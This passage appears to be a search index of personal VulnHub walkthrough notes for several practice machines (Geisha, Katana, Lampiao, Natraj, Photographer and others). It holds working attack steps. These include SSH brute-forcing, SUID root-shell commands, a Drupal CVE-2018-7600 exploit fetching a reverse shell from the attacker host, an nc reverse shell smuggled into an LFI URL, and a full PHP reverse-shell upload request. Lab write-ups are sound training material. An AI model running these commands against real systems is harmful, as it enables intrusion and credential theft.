Naruto. Linpeas finds an SUID GTFOBins makes this easy gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit root flag","title":"Port Scan"},{"location":"VulnHub/Geisha/","text":"Geisha \u00b6 192.168.1.133 Port scan \u00b6 21/tcp open ftp syn-ack ttl 64 vsftpd 3.0.3 22/tcp open ssh syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.38 ((Debian)) 3389/tcp open http syn-ack ttl 64 nginx 1.14.2 7080/tcp open ssl/http syn-ack ttl 64 LiteSpeed httpd 7125/tcp open http syn-ack ttl 63 nginx 1.17.10 8088/tcp open http syn-ack ttl 64 LiteSpeed httpd 9198/tcp open http syn-ack ttl 64 SimpleHTTPServer 0.6 (Python 2.7.16) Dirbuster found a passwd file at http://192.168.1.133:7125/passwd Was able to brute force the Geisha user with hydra hydra -l geisha -P /usr/share/wordlists/rockyou.txt 192.168.1.133 ssh linpeas.sh foudn that base32 has the SUID bit set LFILE=/etc/passwd && base32 \"$LFILE\" | base32 --decode I fired up john and started to work on cracking the hash. It was taking a while so I starting thinking of other ways into root. Maybe there's an ssh key? LFILE=/root/.ssh/id_rsa && base32 \"$LFILE\" | base32 --decode sure enough! I created the id_rsa file by copying the content and then set valid permissions on the file chdmod 600 ssh -i id_rsa root@localhost I am ROOT!","title":"Geisha"},{"location":"VulnHub/Geisha/#geisha","text":"192.168.1.133","title":"Geisha"},{"location":"VulnHub/Geisha/#port-scan","text":"21/tcp open ftp syn-ack ttl 64 vsftpd 3.0.3 22/tcp open ssh syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.38 ((Debian)) 3389/tcp open http syn-ack ttl 64 nginx 1.14.2 7080/tcp open ssl/http syn-ack ttl 64 LiteSpeed httpd 7125/tcp open http syn-ack ttl 63 nginx 1.17.10 8088/tcp open http syn-ack ttl 64 LiteSpeed httpd 9198/tcp open http syn-ack ttl 64 SimpleHTTPServer 0.6 (Python 2.7.16) Dirbuster found a passwd file at http://192.168.1.133:7125/passwd Was able to brute force the Geisha user with hydra hydra -l geisha -P /usr/share/wordlists/rockyou.txt 192.168.1.133 ssh linpeas.sh foudn that base32 has the SUID bit set LFILE=/etc/passwd && base32 \"$LFILE\" | base32 --decode I fired up john and started to work on cracking the hash. It was taking a while so I starting thinking of other ways into root. Maybe there's an ssh key? LFILE=/root/.ssh/id_rsa && base32 \"$LFILE\" | base32 --decode sure enough! I created the id_rsa file by copying the content and then set valid permissions on the file chdmod 600 ssh -i id_rsa root@localhost I am ROOT!","title":"Port scan"},{"location":"VulnHub/Inclusiveness/","text":"Inclusiveness \u00b6 Port scan \u00b6 21/tcp open ftp syn-ack ttl 64 vsftpd 3.0.3 22/tcp open ssh syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.38 ((Debian)) Ftp allows anonymous login Dirbuster found robots.txt on port 80 but it is not allowing me to read view the content. There is a hint I was able to bypass the restriction by forcing the User-Agent to be Googlebot Now we can see the content of robots.txt The /secret_information/ page has a few links that add a lang parameter to the URL. This parameter is vulnerable to LFI I am able to upload to the ftp in /pub/ which has a path of /var/ftp/pub/ on the linux server. Now do the same with a reverse php shell. This gives a shell as www-data upgrade the shell python -c 'import pty; pty.spawn(\"/bin/bash\")' export TERM=xterm Found an interesting binary with SUID set /home/tom/rootshell . Reviewing the code it looks like I can get root if it thinks I'm tom. I just need to spoof the whois command. Fake whois with path injeciton. echo \"printf 'tom'\"\" > /tmp/whoami Add /tmp to the path export PATH=/tmp:$PATH execute the SUID binary /home/tom/rootshell Now I have a shell as tom. Tom can sudo everything with no password, so becoming root is as easy as sudo su I am root","title":"Inclusiveness"},{"location":"VulnHub/Inclusiveness/#inclusiveness","text":"","title":"Inclusiveness"},{"location":"VulnHub/Inclusiveness/#port-scan","text":"21/tcp open ftp syn-ack ttl 64 vsftpd 3.0.3 22/tcp open ssh syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.38 ((Debian)) Ftp allows anonymous login Dirbuster found robots.txt on port 80 but it is not allowing me to read view the content. There is a hint I was able to bypass the restriction by forcing the User-Agent to be Googlebot Now we can see the content of robots.txt The /secret_information/ page has a few links that add a lang parameter to the URL. This parameter is vulnerable to LFI I am able to upload to the ftp in /pub/ which has a path of /var/ftp/pub/ on the linux server. Now do the same with a reverse php shell. This gives a shell as www-data upgrade the shell python -c 'import pty; pty.spawn(\"/bin/bash\")' export TERM=xterm Found an interesting binary with SUID set /home/tom/rootshell . Reviewing the code it looks like I can get root if it thinks I'm tom. I just need to spoof the whois command. Fake whois with path injeciton. echo \"printf 'tom'\"\" > /tmp/whoami Add /tmp to the path export PATH=/tmp:$PATH execute the SUID binary /home/tom/rootshell Now I have a shell as tom. Tom can sudo everything with no password, so becoming root is as easy as sudo su I am root","title":"Port scan"},{"location":"VulnHub/Katana/","text":"Katana \u00b6 We found the IP using netdiscover 192.168.1.113 Port 80 - Apache \u00b6 on port 80 there is a webserver running with bookstore CSE searchsploit found a few exploits we can try. Tested EDB-48960 (login bypass via SQL injection) and it works exactly as described. Tested EDB-49314 POC 1 which displays a SQL Syntax error. Proof that this exploit is applicable to this instance of CSE Bookstore. SQLmap was able to dump the db, but I haven't been albe to get a shell with it. sqlmap -u http://192.168.1.113/ebook/bookPerPub.php?pubid=4 -p 'pubid' --dbms=mariadb --dump --os-shell Cracked the admin password Port 7080 \u00b6 run gobuster to enum port 7080 Port 8088 \u00b6 Dirbuster found phpinfo.php Dirbuster found upload.html where we were able to upload a php paypload that gave us a reverse shell as the www-data user. Ran linpeas, which didn't find much. Looking at /etc/passwd we see the user katana has a hash in this file. katana:$6$xHSuywb9JP8nPxSD$IdfUzMr6IAu3gAH0q7kdso5Xzh1DGjvoCtQ5Q2FPgjMRQcZ3BbsH.a35O1v8H.Cwj8.WDUdFD9Hmrnr2f2cun.:1000:1000:katana,,,:/home/katana:/bin/bash Initial access \u00b6 By OSINT (cheating) we found we coudl brute force katana s ssh password. Which happened to be root Once on the box we found a file in /home/katana called .ssh_passwd . The contents were katana@katana12345 We then discover the SSH password root is differenet from the linux password for katana katana12345 . Privilege Escalation \u00b6 Linpeas.sh finds capabilities on python which is exploitable with the following command: /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' Found the root flag","title":"Katana"},{"location":"VulnHub/Katana/#katana","text":"We found the IP using netdiscover 192.168.1.113","title":"Katana"},{"location":"VulnHub/Katana/#port-80-apache","text":"on port 80 there is a webserver running with bookstore CSE searchsploit found a few exploits we can try. Tested EDB-48960 (login bypass via SQL injection) and it works exactly as described. Tested EDB-49314 POC 1 which displays a SQL Syntax error. Proof that this exploit is applicable to this instance of CSE Bookstore. SQLmap was able to dump the db, but I haven't been albe to get a shell with it. sqlmap -u http://192.168.1.113/ebook/bookPerPub.php?pubid=4 -p 'pubid' --dbms=mariadb --dump --os-shell Cracked the admin password","title":"Port 80 - Apache"},{"location":"VulnHub/Katana/#port-7080","text":"run gobuster to enum port 7080","title":"Port  7080"},{"location":"VulnHub/Katana/#port-8088","text":"Dirbuster found phpinfo.php Dirbuster found upload.html where we were able to upload a php paypload that gave us a reverse shell as the www-data user. Ran linpeas, which didn't find much. Looking at /etc/passwd we see the user katana has a hash in this file. katana:$6$xHSuywb9JP8nPxSD$IdfUzMr6IAu3gAH0q7kdso5Xzh1DGjvoCtQ5Q2FPgjMRQcZ3BbsH.a35O1v8H.Cwj8.WDUdFD9Hmrnr2f2cun.:1000:1000:katana,,,:/home/katana:/bin/bash","title":"Port 8088"},{"location":"VulnHub/Katana/#initial-access","text":"By OSINT (cheating) we found we coudl brute force katana s ssh password. Which happened to be root Once on the box we found a file in /home/katana called .ssh_passwd . The contents were katana@katana12345 We then discover the SSH password root is differenet from the linux password for katana katana12345 .","title":"Initial access"},{"location":"VulnHub/Katana/#privilege-escalation","text":"Linpeas.sh finds capabilities on python which is exploitable with the following command: /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' Found the root flag","title":"Privilege Escalation"},{"location":"VulnHub/Lampiano/","text":"Lampiao \u00b6 Netdiscover \u00b6 192.168.1.141 Port scan \u00b6 22/tcp open ssh syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0) 80/tcp open tcpwrapped syn-ack ttl 64 1898/tcp open http syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu)) Port 80 \u00b6 Port 1898 \u00b6 Robots.txt has interesting entry: Disallow/CHANGELOG.txt Found an [exploit for drupal 7 < 7.57] (https://github.com/pimps/CVE-2018-7600) RCE via CVE-2018-7600 \u00b6 ./drupa7-CVE-2018-7600.py -c whoami http://lampiano:1898/ Reverse php webshell \u00b6 copy the binary to your working folder cp /usr/share/webshells/php/php-reverse-shell.php . Remove the comments and change IP/port host file on webserver python3 -m http.server 82 Download to victim ./drupa7-CVE-2018-7600.py -c 'wget http://192.168.1.112:88/php-reverse-shell.php' http://lampiano:1898/ Activate the shell by visiting the webpage http://lampiano:1898/shell.php Fix the shell python3 -c 'import pty; pty.spawn(\"/bin/bash\")' export TERM=xterm linPEAS findings \u00b6 Found DB creds in /var/www/html/sites/default/settings.php Get on the SQL db mysql -u drupaluser -pVirgulino Dump the users table +-------+---------------------------------------------------------+ | name | pass | +-------+---------------------------------------------------------+ | | | | tiago | $S$DNZ5o1k/NY7SUgtJvjPqNl40kHKwn4yXy2eroEnOAlpmT0TJ9Sx8 | | Eder | $S$Dv5orvhi7okjmViImnVPmVgfwJ2U..PNK4E9IT/k7Lqz9GZRb7tY | | admin | $S$DQRp/JT8KnSM8cFRgzOlKL83DnHt6yxXieQ5hcq3me2bYeiA5p8A | +-------+---------------------------------------------------------+ Tried cracking the hashes to no aval. Drupal 7 hashes take forever to crack, so I had plenty of time to think. PASSWORD REUSE. I should have immediately tried to su with the db password. At this point we can drop the webshell and switch to ssh if desired. Linpeas findings \u00b6 Linux Exploit Suggester picked up Dirty Cow 2 as a possible exploit. searchsploit -m 40839 Compile & run on victim g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil && ./dcow -s Root Flag \u00b6 Additional Exploitation methods \u00b6 Able to break into tiago by scraping a detailed post and feeding all the words as a password through ssh. It only takes about 7 seconds to find the correct password this way.","title":"Lampiao"},{"location":"VulnHub/Lampiano/#lampiao","text":"","title":"Lampiao"},{"location":"VulnHub/Lampiano/#netdiscover","text":"192.168.1.141","title":"Netdiscover"},{"location":"VulnHub/Lampiano/#port-scan","text":"22/tcp open ssh syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0) 80/tcp open tcpwrapped syn-ack ttl 64 1898/tcp open http syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))","title":"Port scan"},{"location":"VulnHub/Lampiano/#port-80","text":"","title":"Port 80"},{"location":"VulnHub/Lampiano/#port-1898","text":"Robots.txt has interesting entry: Disallow/CHANGELOG.txt Found an [exploit for drupal 7 < 7.57] (https://github.com/pimps/CVE-2018-7600)","title":"Port 1898"},{"location":"VulnHub/Lampiano/#rce-via-cve-2018-7600","text":"./drupa7-CVE-2018-7600.py -c whoami http://lampiano:1898/","title":"RCE via CVE-2018-7600"},{"location":"VulnHub/Lampiano/#reverse-php-webshell","text":"copy the binary to your working folder cp /usr/share/webshells/php/php-reverse-shell.php . Remove the comments and change IP/port host file on webserver python3 -m http.server 82 Download to victim ./drupa7-CVE-2018-7600.py -c 'wget http://192.168.1.112:88/php-reverse-shell.php' http://lampiano:1898/ Activate the shell by visiting the webpage http://lampiano:1898/shell.php Fix the shell python3 -c 'import pty; pty.spawn(\"/bin/bash\")' export TERM=xterm","title":"Reverse php webshell"},{"location":"VulnHub/Lampiano/#linpeas-findings","text":"Found DB creds in /var/www/html/sites/default/settings.php Get on the SQL db mysql -u drupaluser -pVirgulino Dump the users table +-------+---------------------------------------------------------+ | name | pass | +-------+---------------------------------------------------------+ | | | | tiago | $S$DNZ5o1k/NY7SUgtJvjPqNl40kHKwn4yXy2eroEnOAlpmT0TJ9Sx8 | | Eder | $S$Dv5orvhi7okjmViImnVPmVgfwJ2U..PNK4E9IT/k7Lqz9GZRb7tY | | admin | $S$DQRp/JT8KnSM8cFRgzOlKL83DnHt6yxXieQ5hcq3me2bYeiA5p8A | +-------+---------------------------------------------------------+ Tried cracking the hashes to no aval. Drupal 7 hashes take forever to crack, so I had plenty of time to think. PASSWORD REUSE. I should have immediately tried to su with the db password. At this point we can drop the webshell and switch to ssh if desired.","title":"linPEAS findings"},{"location":"VulnHub/Lampiano/#linpeas-findings_1","text":"Linux Exploit Suggester picked up Dirty Cow 2 as a possible exploit. searchsploit -m 40839 Compile & run on victim g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil && ./dcow -s","title":"Linpeas findings"},{"location":"VulnHub/Lampiano/#root-flag","text":"","title":"Root Flag"},{"location":"VulnHub/Lampiano/#additional-exploitation-methods","text":"Able to break into tiago by scraping a detailed post and feeding all the words as a password through ssh. It only takes about 7 seconds to find the correct password this way.","title":"Additional Exploitation methods"},{"location":"VulnHub/Monitoring/","text":"We found the IP using netdiscover 192.168.1.149 A port scan reveals port 80 is running a webserver. We see Nagios XI running on this webserver We found a few public exploits for Nagios XI, some of which appear to require credentials. We tested EDB-44560 and EDB-49422 but neither seemed to work. Using the metasploit module linux/http/nagios_xi_plugins_check_plugin_authenticated_rce we were able to obtain a root shell using the following options Root flag \u00b6","title":"Monitoring"},{"location":"VulnHub/Monitoring/#root-flag","text":"","title":"Root flag"},{"location":"VulnHub/Natraj/","text":"Natraj \u00b6 192.168.1.198 Port scan \u00b6 dirbuster found /console/ which has file.php in it. /console/file.php has an LFI vulnerability. two of the users have interactive bash at login root:x:0:0:root:/root:/bin/bash natraj:x:1000:1000:natraj,,,:/home/natraj:/bin/bash mahakal:x:1001:1001:,,,:/home/mahakal:/bin/bash put the users into a file called users.txt hydra -l http://192.168.1.198/console/file.php?file=../../../../../../../var/log/auth.log&cmd=rm%20/tmp/f;mkfifo%20/tmp/f;%20cat%20/tmp/f%20|%20/bin/sh%20-i%202%3E&1%20|%20nc%20192.168.1.112%209999%20%3E%20/tmp/f","title":"Natraj"},{"location":"VulnHub/Natraj/#natraj","text":"192.168.1.198","title":"Natraj"},{"location":"VulnHub/Natraj/#port-scan","text":"dirbuster found /console/ which has file.php in it. /console/file.php has an LFI vulnerability. two of the users have interactive bash at login root:x:0:0:root:/root:/bin/bash natraj:x:1000:1000:natraj,,,:/home/natraj:/bin/bash mahakal:x:1001:1001:,,,:/home/mahakal:/bin/bash put the users into a file called users.txt hydra -l http://192.168.1.198/console/file.php?file=../../../../../../../var/log/auth.log&cmd=rm%20/tmp/f;mkfifo%20/tmp/f;%20cat%20/tmp/f%20|%20/bin/sh%20-i%202%3E&1%20|%20nc%20192.168.1.112%209999%20%3E%20/tmp/f","title":"Port scan"},{"location":"VulnHub/Photographer/","text":"Found the IP with netdiscover 192.168.1.175 port 80 \u00b6 There is a website running Koken Port 8000 \u00b6 hosting a different Koken site. This one appears to have already been compromised. Port 445 \u00b6 Had a samba share that allows anonymous login. We found a copy of an email with this content Message-ID: 4129F3CA.2020509@dc.edu Date: Mon, 20 Jul 2020 11:40:36 -0400 From: Agi Clarence agi@photographer.com User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; e n-US; rv:1.0.1) Gecko/20020823 Netscape/7.0 X-Accept-Language: en-us, en MIME-Version: 1.0 To: Daisa Ahomi daisa@photographer.com Subject: To Do - Daisa Website's Content-Type: text/plain; charset=us-ascii; format=flo wed Content-Transfer-Encoding: 7bit Hi Daisa! Your site is ready now. Don't forget your secret, my babygirl ;) From the email we gather the admin's name is Daisa , her email address is daisa@photographer.com and the password may be babygirl After hunting around we found an exploit for Koken 0.22.24; EDB-48706 . In the exploit, we see the admin panel can be found at target.com/koken/admin . According to the exploit, we should be able to upload a reverse shell php payload with .jpg extension, and then change it to php to get a reverse shell. We found this to be slightly incorrect. The correct description, is that a payload is provided in the request with a spoofed content-type header. Here is the full content of the request I used to gain a reverse shell using the pentest monkey reverse php payload ```web request POST /koken/api.php?/content HTTP/1.1 Host: 192.168.1.175 Content-Length: 5081 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryusjPIBaZCnX5hxKK User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 x-koken-auth: cookie Accept: / Origin: http://192.168.1.175 Referer: http://192.168.1.175/koken/admin/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: koken_session_ci=pMO4iMnsQwiJxWixw5Jz7ftmkG%2BplyOScVpUbv%2FCGDCvooUs078ZBfklrkuoOeP9QoiZ7QAZYyJi1Z4%2BDD65M9rt4HS5IGwIjv6UKepVgnSup5CpSrlSJkPj9LDmkOrsc49s%2FcJJ%2BW1XbX5PzU8qjL8oMRgjkCKNcNVRcstVXZbuTpIuMx3PL6fLDoGSHx%2Ba5n4iRso%2By%2Bv9tAyYwKmGlCfiix3qosC55l7xVEQtpK7fABXH6EhSPwqlqwex4e1J5rw5a7Ww4kqqff2h8SbPj6uKlN8VzdngfepXTIFHzSgE3LFFUi3jI%2F0DgDv5Lxre338SmpmjYo1b4mivFOUEAwdd8eiYyzObZ33Tw%2Br%2FDSGLwXRASyAYtGNQHYfecefXuU5Hy7aI1G2ZWLDT2aa3uMHgCCw5kBF9TsQPxq%2BclmjUzuGgsnDxAbNpz19OCmRDLiKo3MOxsweYOCmKHan3Iz9IbUMmUZud8KTDHy0rRDxJULgKpCJ5qBGDZz3qeVghORm9lgFLgD9xK0hytEdG49qzAVA18p5bbE7aJFb4q68tQImVuEuUZYcPWTdPG2YX82fNIygIsgQKehc%2FmTdF91KAeg950LpkU3lEDvpIAC%2Fyjub6m%2B%2BZnoco%2FN00O7FTuVh11ezRoipZ6nueXxrAht6dW8jiCrVynT4TwJxbTXMh1yM3dtIWqXvDoDjhO7iAoFVRhOfMH1mWLG4b46W4a2NaNd72jnFNaW2pzoaEA2XmxvPFJd5OQLd9qps1kV%2BYViCNXo5mc4WOC8sUDmYM4OUMN3Ml%2FkRk8jKNW9nx3sDWK%2FoRRUqGk5NjEPCx13k5r%2FE0FbVyICA%2B56qjdvErUM5g1SQ0LXsKkyQaa0opfNFBnAJR7vBzpHKj5Y2M1Pj9fbX7cnJpdRGI%2FdudnK6AONCmFp7%2BlVIzBL6pnVyrl1fsH67d3ugHXegt7YG%2F0wLSTSa4UgZD%2FrHKoP1dyIZ0zNYjAw9mOAbfcJyBBQkG5MknhhAY9eNj5DWZ8%2FMTyJftq1dKI0zQje1f0aseN5XDrh6W4NN68vnUzm0sHIvEWPfNUM7SGgnOPuEiPz35%2BODeZhDyHtEWLCEYu8qcDpztbXLpjiaYBfRDrHlOsauvT15cov%2FcKUXC4HTYC40zK8TwFCwIskL%2FE4no21DJ0%2BRjKoC%2BgAL%2BMKOG2qFJRdnrmHJvIWJ6gTpR%2B1pzrmbeuqwzJlk%2FiBRFR7uPMgbKpDLLvJU2YdunN5GgHmjYBsTrEd68xcqu%2BqE8b%2BEx9zdFvcafWNDfYrgZM%2BodGklnH1FtlZiVST2OPoYffKEbXYYVgX2Bag4qRyd%2FtyUm3d2AqFAi622e869b7becdd70db4afe942458321b54fc5d34 Connection: close ------WebKitFormBoundaryusjPIBaZCnX5hxKK Content-Disposition: form-data; name=\"name\" image2.php ------WebKitFormBoundaryusjPIBaZCnX5hxKK Content-Disposition: form-data; name=\"chunk\" 0 ------WebKitFormBoundaryusjPIBaZCnX5hxKK Content-Disposition: form-data; name=\"chunks\" 1 ------WebKitFormBoundaryusjPIBaZCnX5hxKK Content-Disposition: form-data; name=\"upload_session_start\" 1656460957 ------WebKitFormBoundaryusjPIBaZCnX5hxKK Content-Disposition: form-data; name=\"visibility\" public ------WebKitFormBoundaryusjPIBaZCnX5hxKK Content-Disposition: form-data; name=\"license\" all ------WebKitFormBoundaryusjPIBaZCnX5hxKK Content-Disposition: form-data; name=\"max_download\" none ------WebKitFormBoundaryusjPIBaZCnX5hxKK Content-Disposition: form-data; name=\"file\"; filename=\"image2.php\" Content-Type: image/jpeg array(\"pipe\", \"r\"), // stdin is a pipe that the child will read from 1 => array(\"pipe\", \"w\"), // stdout is a pipe that the child will write to 2 => array(\"pipe\", \"w\") // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1); } // Set everything to non-blocking // Reason: Occsionally reads will block, even though stream_select tells us they won't stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) { // Check for end of TCP connection if (feof($sock)) { printit(\"ERROR: Shell connection terminated\"); break; } // Check for end of STDOUT if (feof($pipes[1])) { printit(\"ERROR: Shell process terminated\"); break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process's STDIN if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); } // If we can read from the process's STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\"); fwrite($sock, $input); } // If we can read from the process's STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); // Like print, but does nothing if we've daemonised ourself // (I can't figure out how to redirect STDOUT like a proper daemon) function printit ($string) { if (!$daemon) { print \"$string\\n\"; } } ?> ------WebKitFormBoundaryusjPIBaZCnX5hxKK-- We have a shell as `www-data` Go User Flag ![Pasted image 20220628192248.png](./Pasted image 20220628192248.png) ## Privilege Escalation Tried to `su` using known password for daisa, didn't work. linpeas identified `php7.2` as having the SUID bit set. This was not immediately evident, so I had to cheat by loooking up the answer on a walkthrough. Once we saw the SUID bit, we made use of [GTFOBins](https://gtfobins.github.io/gtfobins/php/#suid) ```bash /usr/bin/php7.2 -r \"pcntl_exec('/bin/sh', ['-p']);\" This gives us a root shell.","title":"Photographer"},{"location":"VulnHub/Photographer/#port-80","text":"There is a website running Koken","title":"port 80"},{"location":"VulnHub/Photographer/#port-8000","text":"hosting a different Koken site. This one appears to have already been compromised.","title":"Port 8000"},{"location":"VulnHub/Photographer/#port-445","text":"Had a samba share that allows anonymous login. We found a copy of an email with this content Message-ID: 4129F3CA.2020509@dc.edu Date: Mon, 20 Jul 2020 11:40:36 -0400 From: Agi Clarence agi@photographer.com User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; e n-US; rv:1.0.1) Gecko/20020823 Netscape/7.0 X-Accept-Language: en-us, en MIME-Version: 1.0 To: Daisa Ahomi daisa@photographer.com Subject: To Do - Daisa Website's Content-Type: text/plain; charset=us-ascii; format=flo wed Content-Transfer-Encoding: 7bit Hi Daisa! Your site is ready now. Don't forget your secret, my babygirl ;) From the email we gather the admin's name is Daisa , her email address is daisa@photographer.com and the password may be babygirl After hunting around we found an exploit for Koken 0.22.24; EDB-48706 . In the exploit, we see the admin panel can be found at target.com/koken/admin . According to the exploit, we should be able to upload a reverse shell php payload with .jpg extension, and then change it to php to get a reverse shell. We found this to be slightly incorrect. The correct description, is that a payload is provided in the request with a spoofed content-type header. Here is the full content of the request I used to gain a reverse shell using the pentest monkey reverse php payload ```web request POST /koken/api.php?/content HTTP/1.1 Host: 192.168.1.175 Content-Length: 5081 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryusjPIBaZCnX5hxKK User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 x-koken-auth: cookie Accept: / Origin: http://192.168.1.175 Referer: http://192.168.1.175/koken/admin/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: koken_session_ci=pMO4iMnsQwiJxWixw5Jz7ftmkG%2BplyOScVpUbv%2FCGDCvooUs078ZBfklrkuoOeP9QoiZ7QAZYyJi1Z4%2BDD65M9rt4HS5IGwIjv6UKepVgnSup5CpSrlSJkPj9LDmkOrsc49s%2FcJJ%2BW1XbX5PzU8qjL8oMRgjkCKNcNVRcstVXZbuTpIuMx3PL6fLDoGSHx%2Ba5n4iRso%2By%2Bv9tAyYwKmGlCfiix3qosC55l7xVEQtpK7fABXH6EhSPwqlqwex4e1J5rw5a7Ww4kqqff2h8SbPj6uKlN8VzdngfepXTIFHzSgE3LFFUi3jI%2F0DgDv5Lxre338SmpmjYo1b4mivFOUEAwdd8eiYyzObZ33Tw%2Br%2FDSGLwXRASyAYtGNQHYfecefXuU5Hy7aI1G2ZWLDT2aa3uMHgCCw5kBF9TsQPxq%2BclmjUzuGgsnDxAbNpz19OCmRDLiKo3MOxsweYOCmKHan3Iz9IbUMmUZud8KTDHy0rRDxJULgKpCJ5qBGDZz3qeVghORm9lgFLgD9xK0hytEdG49qzAVA18p5bbE7aJFb4q68tQImVuEuUZYcPWTdPG2YX82fNIygIsgQKehc%2FmTdF91KAeg950LpkU3lEDvpIAC%2Fyjub6m%2B%2BZnoco%2FN00O7FTuVh11ezRoipZ6nueXxrAht6dW8jiCrVynT4TwJxbTXMh1yM3dtIWqXvDoDjhO7iAoFVRhOfMH1mWLG4b46W4a2NaNd72jnFNaW2pzoaEA2XmxvPFJd5OQLd9qps1kV%2BYViCNXo5mc4WOC8sUDmYM4OUMN3Ml%2FkRk8jKNW9nx3sDWK%2FoRRUqGk5NjEPCx13k5r%2FE0FbVyICA%2B56qjdvErUM5g1SQ0LXsKkyQaa0opfNFBnAJR7vBzpHKj5Y2M1Pj9fbX7cnJpdRGI%2FdudnK6AONCmFp7%2BlVIzBL6pnVyrl1fsH67d3ugHXegt7YG%2F0wLSTSa4UgZD%2FrHKoP1dyIZ0zNYjAw9mOAbfcJyBBQkG5MknhhAY9eNj5DWZ8%2FMTyJftq1dKI0zQje1f0aseN5XDrh6W4NN68vnUzm0sHIvEWPfNUM7SGgnOPuEiPz35%2BODeZhDyHtEWLCEYu8qcDpztbXLpjiaYBfRDrHlOsauvT15cov%2FcKUXC4HTYC40zK8TwFCwIskL%2FE4no21DJ0%2BRjKoC%2BgAL%2BMKOG2qFJRdnrmHJvIWJ6gTpR%2B1pzrmbeuqwzJlk%2FiBRFR7uPMgbKpDLLvJU2YdunN5GgHmjYBsTrEd68xcqu%2BqE8b%2BEx9zdFvcafWNDfYrgZM%2BodGklnH1FtlZiVST2OPoYffKEbXYYVgX2Bag4qRyd%2FtyUm3d2AqFAi622e869b7becdd70db4afe942458321b54fc5d34 Connection: close ------WebKitFormBoundaryusjPIBaZCnX5hxKK Content-Disposition: form-data; name=\"name\" image2.php ------WebKitFormBoundaryusjPIBaZCnX5hxKK Content-Disposition: form-data; name=\"chunk\" 0 ------WebKitFormBoundaryusjPIBaZCnX5hxKK Content-Disposition: form-data; name=\"chunks\" 1 ------WebKitFormBoundaryusjPIBaZCnX5hxKK Content-Disposition: form-data; name=\"upload_session_start\" 1656460957 ------WebKitFormBoundaryusjPIBaZCnX5hxKK Content-Disposition: form-data; name=\"visibility\" public ------WebKitFormBoundaryusjPIBaZCnX5hxKK Content-Disposition: form-data; name=\"license\" all ------WebKitFormBoundaryusjPIBaZCnX5hxKK Content-Disposition: form-data; name=\"max_download\" none ------WebKitFormBoundaryusjPIBaZCnX5hxKK Content-Disposition: form-data; name=\"file\"; filename=\"image2.php\" Content-Type: image/jpeg array(\"pipe\", \"r\"), // stdin is a pipe that the child will read from 1 => array(\"pipe\", \"w\"), // stdout is a pipe that the child will write to 2 => array(\"pipe\", \"w\") // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1); } // Set everything to non-blocking // Reason: Occsionally reads will block, even though stream_select tells us they won't stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) { // Check for end of TCP connection if (feof($sock)) { printit(\"ERROR: Shell connection terminated\"); break; } // Check for end of STDOUT if (feof($pipes[1])) { printit(\"ERROR: Shell process terminated\"); break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process's STDIN if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); } // If we can read from the process's STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) 